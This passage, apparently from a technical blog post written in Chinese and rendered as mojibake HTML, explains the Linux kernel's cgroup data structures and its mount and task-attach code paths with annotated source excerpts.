&lt;p&gt;&lt;code&gt;css_set&lt;/code&gt;ç»“æ„ä½“è¡¨ç¤ºä¸€ç§èµ„æºé™åˆ¶çš„é›†åˆ(æ¯”å¦‚&lt;code&gt;cpu 20% mem 40%&lt;/code&gt;å’Œ&lt;code&gt;cpu 30% mem 20%&lt;/code&gt;æ˜¯ä¸åŒçš„èµ„æºé™åˆ¶ï¼Œç”¨ä¸åŒçš„css_set)å¹¶ä¸”è¿æ¥è¿›ç¨‹å’Œsubsysã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct css_set { 
â€¦ 
    // å…³è”æ­¤css_setçš„è¿›ç¨‹é“¾è¡¨
    struct list_head tasks;
    // å…³è”çš„cgroupé“¾è¡¨ï¼Œé€šè¿‡cg_cgroup_linkç»“æ„ä½“æ¥è¿æ¥
    struct list_head cgrp_links; 
    // cg_linksç”¨äºé“¾æ¥æ‰€æœ‰å…³äºæ­¤css_setçš„cgroupï¼Œcgroupå¹¶ä¸æ˜¯ç›´æ¥è¿æ¥åˆ°æ­¤list_headï¼Œè€Œæ˜¯é€šè¿‡cg_cgroup_linkç»“æ„ä½“è¿æ¥ã€‚

    // ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ æŒ‡å‘ä¸€ä¸ªcgroup_subsys_stateï¼Œè¿™ä¸ªæ•°ç»„å…ƒç´ ä¸subsystemçš„ä¸ªæ•°ä¸€ä¸€å¯¹åº”
    struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];
â€¦ 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;task_struct&#34;&gt;task_structï¼š&lt;/h5&gt;
&lt;p&gt;è¿›ç¨‹ç»“æ„ä½“&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/sched.h 
struct task_struct { 
â€¦ 
#ifdef CONFIG_CGROUPS 
    // è¯¥è¿›ç¨‹å…³è”çš„css_set
    struct css_set __rcu *cgroups; 
    // é“¾æ¥åˆ°å…³è”css_setçš„taské“¾è¡¨
    struct list_head cg_list; 
#endif 
â€¦ 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454850635.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;taskå¯ä»¥é€šè¿‡task_struct-&amp;gt;css_set-&amp;gt;cgroup_subsys_stateæ‰¾åˆ°è¯¥taskæ‰€å—å­ç³»ç»Ÿçš„é™åˆ¶ã€‚&lt;/p&gt;
&lt;h4 id=&#34;cgroup&#34;&gt;cgroup&lt;/h4&gt;
&lt;p&gt;åœ¨ç»“æ„ä½“&lt;code&gt;cgroup&lt;/code&gt;ä¸­ï¼Œä¸€ä¸ª&lt;code&gt;cgroup&lt;/code&gt;å®ä¾‹å°±æ˜¯cgroupæ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªcgroupæ–‡ä»¶ï¼Œ&lt;code&gt;cgroup&lt;/code&gt;ç»“æ„ä½“ä¸»è¦ä½œç”¨æ˜¯å…³è”&lt;code&gt;css_set&lt;/code&gt;å’Œ&lt;code&gt;subsys&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äº&lt;code&gt;task&lt;/code&gt;åˆ°&lt;code&gt;cgroup&lt;/code&gt;ä¸éœ€è¦ç›´æ¥è¿æ¥ï¼Œå¯ä»¥é€šè¿‡&lt;code&gt;css_set&lt;/code&gt;å¼•ç”¨åˆ°&lt;code&gt;cgroup&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
// å­èŠ‚ç‚¹cgroup
struct cgroup { 
    â€¦ 
    unsigned long flags;	// ç”¨äºæ ‡è¯†å½“å‰cgroupçš„çŠ¶æ€
    struct list_head sibling;         // å…„å¼ŸèŠ‚ç‚¹é“¾è¡¨
    struct list_head children;        // å­èŠ‚ç‚¹é“¾è¡¨
    struct cgroup *parent;            // çˆ¶èŠ‚ç‚¹ 

    struct list_head files;           /* my files */ 
    struct dentry *dentry;            // è¯¥cgroupå¯¹åº”çš„ç›®å½•çš„æè¿° 
    struct cgroupfs_root *root;  // æŒ‡å‘hierarchyç»“æ„ä½“ï¼Œæ¯ä¸ªcgroupæ–‡ä»¶ç³»ç»Ÿéƒ½æœ‰ä¸€ä¸ªcgroupfs_rootï¼Œåœ¨mountæ—¶åˆ›å»º

    struct cgroup_subsys_state __rcu *subsys[CGROUP_SUBSYS_COUNT];  // æä¾›ç»™å„å­ç³»ç»Ÿçš„é™åˆ¶èµ„æºç»Ÿè®¡æ•°æ®

    struct list_head cset_links; 
    struct list_head e_csets[CGROUP_SUBSYS_COUNT]; // ä½¿ç”¨çš„æ‰€æœ‰å­ç³»ç»Ÿçš„æ¯ä¸ªé“¾è¡¨
    â€¦ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¤§è‡´å¯ä»¥åˆ†ä¸º4éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;h5 id=&#34;1å±‚çº§ç»“æ„æˆå‘˜&#34;&gt;1.å±‚çº§ç»“æ„æˆå‘˜&lt;/h5&gt;
&lt;p&gt;ç”¨äºæè¿°cgroupå±‚çº§ç»“æ„çš„æˆå‘˜ï¼ŒåŒ…æ‹¬&lt;code&gt;sibling children parent&lt;/code&gt;ä¸‰ä¸ªæˆå‘˜ï¼›&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454873202.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h5 id=&#34;2æ–‡ä»¶æè¿°ç›¸å…³æˆå‘˜&#34;&gt;2.æ–‡ä»¶æè¿°ç›¸å…³æˆå‘˜&lt;/h5&gt;
&lt;p&gt;åŒ…æ‹¬&lt;code&gt;files dentry root&lt;/code&gt;ä¸‰ä¸ªæˆå‘˜ã€‚&lt;/p&gt;
&lt;p&gt;å†…æ ¸cgroupå­ç³»ç»Ÿåˆ›é€ äº†åä¸ºcgroupçš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚æ¯ä¸ªcgroupèŠ‚ç‚¹éƒ½å’Œæ­¤æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç›®å½•ç›¸è”ç³»ã€‚&lt;/p&gt;
&lt;p&gt;ç»“æ„ä½“ä¸­æˆå‘˜&lt;code&gt;dentry *dentry&lt;/code&gt;æŒ‡å‘ä¸ä¹‹ç›¸å…³è”çš„ç›®å½•ï¼Œæˆå‘˜&lt;code&gt;list_head files&lt;/code&gt;æŒ‡å‘ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œæˆå‘˜&lt;code&gt;cgroupfs_root *root&lt;/code&gt;æŒ‡å‘cgroupæ–‡ä»¶ç³»ç»Ÿçš„æ ¹èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;h5 id=&#34;3å­ç³»ç»Ÿç›¸å…³æˆå‘˜&#34;&gt;3.å­ç³»ç»Ÿç›¸å…³æˆå‘˜&lt;/h5&gt;
&lt;p&gt;é¦–å…ˆå…ˆçœ‹&lt;code&gt;cgroup_subsys&lt;/code&gt;ç»“æ„ä½“ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;cgroupé€šè¿‡æ­¤ç»“æ„ä½“æ“ä½œå„ä¸ªå­ç³»ç»Ÿï¼Œæ¯ä¸ªå­ç³»ç»Ÿéƒ½éœ€è¦å®ç°è¿™æ ·çš„ä¸€ä¸ªç»“æ„ä½“ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroup_subsys {
    struct cgroup_subsys_state *(*create)(struct cgroup_subsys *ss,
                          struct cgroup *cgrp);
    void (*pre_destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp);
    void (*destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp);
    int (*can_attach)(struct cgroup_subsys *ss,
              struct cgroup *cgrp, struct task_struct *tsk);
    void (*attach)(struct cgroup_subsys *ss, struct cgroup *cgrp,
            struct cgroup *old_cgrp, struct task_struct *tsk);
    void (*fork)(struct cgroup_subsys *ss, struct task_struct *task);
    void (*exit)(struct cgroup_subsys *ss, struct task_struct *task);
    int (*populate)(struct cgroup_subsys *ss,
            struct cgroup *cgrp);
    void (*post_clone)(struct cgroup_subsys *ss, struct cgroup *cgrp);
    void (*bind)(struct cgroup_subsys *ss, struct cgroup *root);

    int subsys_id; // è¡¨ç¤ºäº†å­ç³»ç»Ÿçš„ID
    int active; // è¡¨ç¤ºå­ç³»ç»Ÿæ˜¯å¦è¢«æ¿€æ´»
    int disabled; // å­ç³»ç»Ÿæ˜¯å¦è¢«ç¦æ­¢
    int early_init;
    const char *name; // å­ç³»ç»Ÿåç§°
    struct cgroupfs_root *root; // è¢«é™„åŠ åˆ°çš„å±‚çº§æŒ‚è½½ç‚¹
    struct list_head sibling; // ç”¨äºè¿æ¥è¢«é™„åŠ åˆ°åŒä¸€ä¸ªå±‚çº§çš„æ‰€æœ‰å­ç³»ç»Ÿ
    void *private; // ç§æœ‰æ•°æ®
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt; ç»“æ„åŒ…å«äº†å¾ˆå¤šå‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡è¿™äº›å‡½æ•°æŒ‡é’ˆï¼Œcgroupå¯ä»¥å¯¹å­ç³»ç»Ÿè¿›è¡Œä¸€äº›æ“ä½œã€‚ä¾‹å¦‚å‘ cgroup çš„ tasks æ–‡ä»¶æ·»åŠ è¦æ§åˆ¶çš„è¿›ç¨‹PIDæ—¶ï¼Œå°±ä¼šè°ƒç”¨ &lt;code&gt;cgroup_subsys&lt;/code&gt; ç»“æ„çš„ &lt;code&gt;attach()&lt;/code&gt; å‡½æ•°ã€‚å½“åœ¨å±‚çº§ä¸­åˆ›å»ºæ–°ç›®å½•æ—¶ï¼Œå°±ä¼šè°ƒç”¨ &lt;code&gt;create()&lt;/code&gt; å‡½æ•°åˆ›å»ºä¸€ä¸ªå­ç³»ç»Ÿçš„èµ„æºæ§åˆ¶ç»Ÿè®¡ä¿¡æ¯å¯¹è±¡ &lt;code&gt;cgroup_subsys_state&lt;/code&gt;ï¼Œå¹¶ä¸”è°ƒç”¨ &lt;code&gt;populate()&lt;/code&gt; å‡½æ•°åˆ›å»ºå­ç³»ç»Ÿç›¸å…³çš„èµ„æºæ§åˆ¶ä¿¡æ¯æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªsubsysæœ‰è‡ªå·±çš„å±æ€§å’Œæ“ä½œï¼Œç”¨ç›¸åŒçš„ç»“æ„ä½“æ¥æè¿°subsysæœ‰ç‚¹å¤ªå›°éš¾ï¼Œcgroup_subsysæè¿°çš„æ˜¯subsysé€šç”¨çš„éƒ¨åˆ†ï¼Œå„ç§ä¸åŒçš„å­ç³»ç»Ÿæ˜¯æœ‰è‡ªå·±çš„ç»“æ„ä½“çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚å†…å­˜å­ç³»ç»Ÿï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct cgroup_subsys mem_cgroup_subsys = {
    .name = &amp;quot;memory&amp;quot;,
    .subsys_id = mem_cgroup_subsys_id,
    .create = mem_cgroup_create,
    .pre_destroy = mem_cgroup_pre_destroy,
    .destroy = mem_cgroup_destroy,
    .populate = mem_cgroup_populate,
    .attach = mem_cgroup_move_task,
    .early_init = 0,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦å¤– Linux å†…æ ¸è¿˜å®šä¹‰äº†ä¸€ä¸ª &lt;code&gt;cgroup_subsys&lt;/code&gt; ç»“æ„çš„æ•°ç»„ &lt;code&gt;subsys&lt;/code&gt;ï¼Œç”¨äºä¿å­˜æ‰€æœ‰å­ç³»ç»Ÿçš„ &lt;code&gt;cgroup_subsys&lt;/code&gt; ç»“æ„ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static struct cgroup_subsys *subsys[] = {
    cpuset_subsys,
    debug_subsys,
    ns_subsys,
    cpu_cgroup_subsys,
    cpuacct_subsys,
    mem_cgroup_subsys
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys_state&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç»“æ„ä½“&lt;code&gt;cgroup_subsys_state&lt;/code&gt;æ˜¯ä¸€ä¸ª&amp;quot;ä¸­ä»‹&amp;quot;ï¼Œä»‹äºç»“æ„ä½“&lt;code&gt;cgroup&lt;/code&gt;å’Œç»“æ„ä½“&lt;code&gt;cgroup_subsys&lt;/code&gt;ä¹‹é—´ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// include/linux/cgroup.h
struct cgroup_subsys_state {

    // æœ¬subsysæ‰€ä¾é™„çš„cgroup
    struct cgroup *cgroup;

    // ç”¨åˆ°çš„å­ç³»ç»Ÿ
    struct cgroup_subsys *ss;
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å…¶ä¸­å¹¶ä¸åŒ…å«å­ç³»ç»Ÿçš„ç›¸å…³èµ„æºç»Ÿè®¡ä¿¡æ¯ï¼Œè€ŒçœŸæ­£çš„ä¿¡æ¯æ˜¯å­˜åœ¨å…·ä½“å­ç³»ç»Ÿç»“æ„ä½“ä¸­çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚mem_cgroup:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct mem_cgroup {
    struct cgroup_subsys_state css;
    struct res_counter res;
    struct mem_cgroup_lru_info info;
    int prev_priority;
    struct mem_cgroup_stat stat;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ªå­—æ®µå°±æ˜¯æŒ‡å‘&lt;code&gt;cgroup_subsys_state&lt;/code&gt;ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œå…¶ä½™éƒ¨åˆ†ä¿¡æ¯ç”±mem_cgroupè‡ªå·±ç»´æŠ¤ï¼Œå› æ­¤ä»–ä»¬ä¹‹é—´çš„å…³ç³»ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454888137.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;cgroup&lt;/code&gt;å’Œ&lt;code&gt;cgroup_subsys_state&lt;/code&gt;çš„å…³ç³»ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454896518.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h5 id=&#34;4è¿›ç¨‹ç›¸å…³æˆå‘˜&#34;&gt;4.è¿›ç¨‹ç›¸å…³æˆå‘˜&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;cset_links&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;cgroupèŠ‚ç‚¹å’Œè¿›ç¨‹æ˜¯å¤šå¯¹å¤šæ˜ å°„ã€‚ä¸€ä¸ªcgrouèŠ‚ç‚¹ä¸­å¯ä»¥æœ‰å¤šä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥åŠ å…¥å¤šä¸ªcgroupã€‚&lt;/p&gt;
&lt;p&gt;å‡è®¾æœ‰ 3 ä¸ªè¿›ç¨‹ï¼Œ4 ä¸ªæ§åˆ¶ç»„ï¼Œè¿›ç¨‹ 1 ç”¨åˆ°æ§åˆ¶ç»„ 1 å’Œ 3ï¼Œè¿›ç¨‹ 2 ç”¨åˆ°æ§åˆ¶ç»„ 2 å’Œ 4ï¼Œè¿›ç¨‹ 3 ç”¨åˆ°æ§åˆ¶ç»„ 2 å’Œ 4ã€‚ä»è¿›ç¨‹çš„è§’åº¦çœ‹å’Œä»æ§åˆ¶ç»„çš„è§’åº¦çœ‹ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996726696.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨ç»“æ„cgroupä¸­æœ‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct cgroup { 
â€¦ 
    struct list_head cset_links; 
â€¦ 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æ„ cgroup çš„æˆå‘˜ &lt;code&gt;cset_links&lt;/code&gt; å’Œå¦ä¸€ä¸ªç»“æ„ &lt;code&gt;cgrp_cset_link&lt;/code&gt; å…³è”ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;kernel/cgroup.c 
struct cgrp_cset_link { 
    /* the cgroup and css_set this link associates */ 
    struct cgroup *cgrp; 
    struct css_set *cset; 
    /* list of cgrp_cset_links anchored at cgrp-&amp;gt;cset_links */ 
    struct list_head cset_link; 
    /* list of cgrp_cset_links anchored at css_set-&amp;gt;cgrp_links */ 
    struct list_head cgrp_link; 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è”ç³»åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯ä¸Šé¢é‚£ä¸ªä¾‹å­ï¼Œå†…æ ¸ä¸­çš„æ•°æ®ç»“æ„å¦‚å›¾æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996916634.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;cgroup_root&lt;/code&gt;å’Œ&lt;code&gt;cgroup&lt;/code&gt;æ˜¯ä½¿ç”¨ä¸¤ä¸ªä¸åŒç»“æ„è¡¨ç¤ºçš„ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454918787.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454944616.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;æ–‡ä»¶ç³»ç»Ÿæ¥å£&#34;&gt;æ–‡ä»¶ç³»ç»Ÿæ¥å£&lt;/h3&gt;
&lt;p&gt;cgroupæ–‡ä»¶ç³»ç»Ÿæ˜¯cgroupæä¾›ç»™ç”¨æˆ·å±‚çš„æ§åˆ¶æ¥å£ï¼Œcgroupæ–‡ä»¶ç³»ç»ŸæŒ‚ä¸æŒ‚è½½ï¼Œcgroupéƒ½æ˜¯ç”Ÿæ•ˆè¿è¡Œçš„ã€‚&lt;/p&gt;
&lt;h4 id=&#34;mountå‡½æ•°&#34;&gt;mountå‡½æ•°&lt;/h4&gt;
&lt;p&gt;æŒ‚è½½æœ€ç»ˆä¼šè°ƒç”¨åˆ°å†…æ ¸å‡½æ•°&lt;code&gt;cgroup_get_sb()&lt;/code&gt;ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static int cgroup_get_sb(struct file_system_type *fs_type,
     int flags, const char *unused_dev_name,
     void *data, struct vfsmount *mnt)
{
    ...
    struct cgroupfs_root *root;
    ...
    root = kzalloc(sizeof(*root), GFP_KERNEL);
    ...
    ret = rebind_subsystems(root, root-&amp;gt;subsys_bits);
    ...

    struct cgroup *cgrp = &amp;amp;root-&amp;gt;top_cgroup;

    cgroup_populate_dir(cgrp);
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¦–å…ˆä¼šè°ƒç”¨ &lt;code&gt;kzalloc()&lt;/code&gt; å‡½æ•°åˆ›å»ºä¸€ä¸ª &lt;code&gt;cgroupfs_root&lt;/code&gt; ç»“æ„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cgroupfs_root&lt;/code&gt;ç»“æ„ä¸»è¦ç”¨äºæè¿°è¿™ä¸ªæŒ‚è½½ç‚¹çš„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroupfs_root {
    struct super_block *sb; // æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿè¶…çº§å—
    unsigned long subsys_bits; // é™„åŠ åˆ°æ­¤å±‚çº§çš„å­ç³»ç»Ÿæ ‡å¿—
    unsigned long actual_subsys_bits; // é™„åŠ åˆ°æ­¤å±‚çº§çš„å­ç³»ç»Ÿæ ‡å¿—
    struct list_head subsys_list; // é™„åŠ åˆ°æ­¤å±‚çº§çš„å­ç³»ç»Ÿ(cgroup_subsys)åˆ—è¡¨
    struct cgroup top_cgroup; // æ­¤å±‚çº§çš„æ ¹cgroup
    int number_of_cgroups; // å±‚çº§ä¸­æœ‰å¤šå°‘ä¸ªcgroup
    struct list_head root_list; // è¿æ¥ç³»ç»Ÿä¸­æ‰€æœ‰çš„cgroupfs_root
    unsigned long flags; // æ ‡å¿—ä½
    char release_agent_path[PATH_MAX];
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯&lt;code&gt;subsys_list&lt;/code&gt;ï¼Œè¡¨ç¤ºé™„åŠ åˆ°æ­¤å±‚çº§ä¸Šçš„æ‰€æœ‰å­ç³»ç»Ÿï¼›&lt;code&gt;top_cgroup&lt;/code&gt;å­—æ®µè¡¨ç¤ºæ­¤å±‚çº§çš„æ ¹&lt;code&gt;cgroup&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åè°ƒç”¨&lt;code&gt;rebind_subsystems()&lt;/code&gt;å‡½æ•°ï¼ŒæŠŠæŒ‚è½½æ—¶æŒ‡å®šçš„å­ç³»ç»Ÿæ·»åŠ åˆ°&lt;code&gt;cgroupsfs_root&lt;/code&gt;ç»“æ„å®ä¾‹&lt;code&gt;root.subsys_list&lt;/code&gt;é“¾è¡¨ä¸Šï¼Œå¹¶ä¸”ä¸ºæ­¤å±‚çº§ç»“æ„çš„æ ¹&lt;code&gt;cgroup.subsys&lt;/code&gt;å­—æ®µè®¾ç½®å„ä¸ªå­ç³»ç»Ÿçš„èµ„æºæ§åˆ¶ç»Ÿè®¡ä¿¡æ¯å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åè°ƒç”¨&lt;code&gt;cgroup_populate_dir()&lt;/code&gt;å‡½æ•°å‘æŒ‚è½½ç›®å½•åˆ›å»ºç®¡ç†æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;h4 id=&#34;attachå‡½æ•°&#34;&gt;attachå‡½æ•°&lt;/h4&gt;
&lt;p&gt;å½“å‘tasksæ–‡ä»¶ä¸­å†™å…¥pidæ—¶ï¼Œä¼šç”¨è°ƒç”¨&lt;code&gt;attach_task_by_pid()&lt;/code&gt;å‡½æ•°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static int attach_task_by_pid(struct cgroup *cgrp, char *pidbuf)
{
    pid_t pid;
    struct task_struct *tsk;
    int ret;

    if (sscanf(pidbuf, &amp;quot;%d&amp;quot;, &amp;amp;pid) != 1) // è¯»å–è¿›ç¨‹pid
        return -EIO;

    if (pid) { // å¦‚æœæœ‰æŒ‡å®šè¿›ç¨‹pid
        ...
        tsk = find_task_by_vpid(pid); // é€šè¿‡pidæŸ¥æ‰¾å¯¹åº”è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦
        if (!tsk || tsk-&amp;gt;flags &amp;amp; PF_EXITING) {
            rcu_read_unlock();
            return -ESRCH;
        }
        ...
    } else {
        tsk = current; // å¦‚æœæ²¡æœ‰æŒ‡å®šè¿›ç¨‹pid, å°±ä½¿ç”¨å½“å‰è¿›ç¨‹
        ...
    }

    ret = cgroup_attach_task(cgrp, tsk); // è°ƒç”¨ cgroup_attach_task() æŠŠè¿›ç¨‹æ·»åŠ åˆ°cgroupä¸­
    ...
    return ret;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤å‡½æ•°ä¸­ä¼šå…ˆåˆ¤æ–­æ˜¯å¦æŒ‡å®šäº†pidï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šåˆ™é»˜è®¤ä¸ºå½“å‰è¿›ç¨‹ï¼Œç„¶åè°ƒç”¨&lt;code&gt;cgroup_attach_task()&lt;/code&gt;å‡½æ•°æŠŠè¿›ç¨‹æ·»åŠ åˆ°&lt;code&gt;cgroup&lt;/code&gt;ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cgroup_attach_task()&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int cgroup_attach_task(struct cgroup *cgrp, struct task_struct *tsk)
{
    int retval = 0;
    struct cgroup_subsys *ss;
    struct cgroup *oldcgrp;
    struct css_set *cg = tsk-&amp;gt;cgroups;
    struct css_set *newcg;
    struct cgroupfs_root *root = cgrp-&amp;gt;root;

    ...
    newcg = find_css_set(cg, cgrp); // æ ¹æ®æ–°çš„cgroupæŸ¥æ‰¾css_setå¯¹è±¡
    ...
    rcu_assign_pointer(tsk-&amp;gt;cgroups, newcg); // æŠŠè¿›ç¨‹çš„cgroupså­—æ®µè®¾ç½®ä¸ºæ–°çš„css_setå¯¹è±¡
    ...
    // æŠŠè¿›ç¨‹æ·»åŠ åˆ°css_setå¯¹è±¡çš„tasksåˆ—è¡¨ä¸­
    write_lock(&amp;amp;css_set_lock);
    if (!list_empty(&amp;amp;tsk-&amp;gt;cg_list)) {
        list_del(&amp;amp;tsk-&amp;gt;cg_list);
        list_add(&amp;amp;tsk-&amp;gt;cg_list, &amp;amp;newcg-&amp;gt;tasks);
    }
    write_unlock(&amp;amp;css_set_lock);

    // è°ƒç”¨å„ä¸ªå­ç³»ç»Ÿçš„attachå‡½æ•°
    for_each_subsys(root, ss) {
        if (ss-&amp;gt;attach)
            ss-&amp;gt;attach(ss, cgrp, oldcgrp, tsk);
    }
    ...
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤å‡½æ•°é¦–å…ˆä¼š&lt;code&gt;find_css_set()&lt;/code&gt;å‡½æ•°&lt;strong&gt;æŸ¥æ‰¾æˆ–åˆ›å»º&lt;/strong&gt;ä¸€ä¸ª&lt;code&gt;css_set&lt;/code&gt;å¯¹è±¡ï¼Œæ­¤&lt;code&gt;css_set&lt;/code&gt;å¯¹è±¡åŒ…å«äº†è¯¥è¿›ç¨‹æ‰€åœ¨çš„&lt;code&gt;cgroup&lt;/code&gt;ä¸­æ‰€åŒ…å«çš„å­ç³»ç»Ÿï¼Œé€šè¿‡&lt;code&gt;css_set&lt;/code&gt;èƒ½å¿«é€ŸæŸ¥è¯¢åˆ°è¯¥è¿›ç¨‹è¢«é™åˆ¶çš„èµ„æºã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åæŠŠè¿›ç¨‹å®ä¾‹&lt;code&gt;tsk.cgroup&lt;/code&gt;å­—æ®µè®¾ç½®æˆè¯¥&lt;code&gt;css_set&lt;/code&gt;ï¼Œç„¶åæŠŠæ­¤è¿›ç¨‹æ·»åŠ åˆ°&lt;code&gt;css_set.tasks&lt;/code&gt;åˆ—è¡¨ä¸­ï¼Œè¡¨ç¤ºå…³è”æ­¤&lt;code&gt;css_set&lt;/code&gt;çš„è¿›ç¨‹åˆ—è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åè°ƒç”¨å±‚çº§ç»“æ„ä¸Šçš„æ‰€æœ‰å­ç³»ç»Ÿçš„&lt;code&gt;attach()&lt;/code&gt;å‡½æ•°ï¼Œå¯¹æ–°å¢è¿›ç¨‹è¿›è¡Œä¸€ç³»åˆ—å…¶å®ƒæ“ä½œ(å…·ä½“å­ç³»ç»Ÿå¤„ç†ä¼šæœ‰æ‰€ä¸åŒ)ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å„ä¸ªå­ç³»ç»Ÿçš„å®ç°&#34;&gt;å„ä¸ªå­ç³»ç»Ÿçš„å®ç°&lt;/h3&gt;
